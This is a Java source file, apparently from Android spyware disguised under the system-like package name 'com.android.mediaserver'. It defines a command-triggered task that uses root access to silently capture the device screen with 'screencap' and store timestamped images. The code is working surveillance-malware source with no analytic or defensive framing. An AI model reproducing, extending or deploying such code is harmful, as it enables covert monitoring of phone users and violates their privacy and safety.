package com.android.mediaserver.task;

import android.content.Context;
import com.android.mediaserver.command.Command;
import com.android.mediaserver.config.Config;
import com.android.mediaserver.shell.Shell.SU;
import com.sromku.simple.storage.SimpleStorage;
import java.io.File;
import timber.log.Timber;

public class ScreenshotTask extends Task {
  public ScreenshotTask(Command command, Context context) {
    super(command, context);
  }

  protected Void doInBackground(Void... params) {
    Timber.d("ScreenshotTask started", new Object[0]);
    publishProgress(new TaskStatus[] { TaskStatus.IN_PROGRESS });
    if (takeScreenshot()) {
      publishProgress(new TaskStatus[] { TaskStatus.SUCCEEDED });
      Timber.d("ScreenshotTask succeeded", new Object[0]);
    } else {
      publishProgress(new TaskStatus[] { TaskStatus.FAILED });
      Timber.d("ScreenshotTask failed", new Object[0]);
    }
    return null;
  }

  protected void onPostExecute(Void aVoid) {
    super.onPostExecute(aVoid);
  }

  private boolean takeScreenshot() {
    String screenshotsDirectory = SimpleStorage.getInternalStorage(this.mContext)
        .getFile(Config.getInstance(this.mContext).getScreenshotsDirectoryName())
        .getAbsolutePath();
    if (SU.run("screencap -p " + (screenshotsDirectory + File.separator + (String.valueOf(
        System.currentTimeMillis()) + ".png"))).size() != 0) {
      return false;
    }
    return true;
  }
}
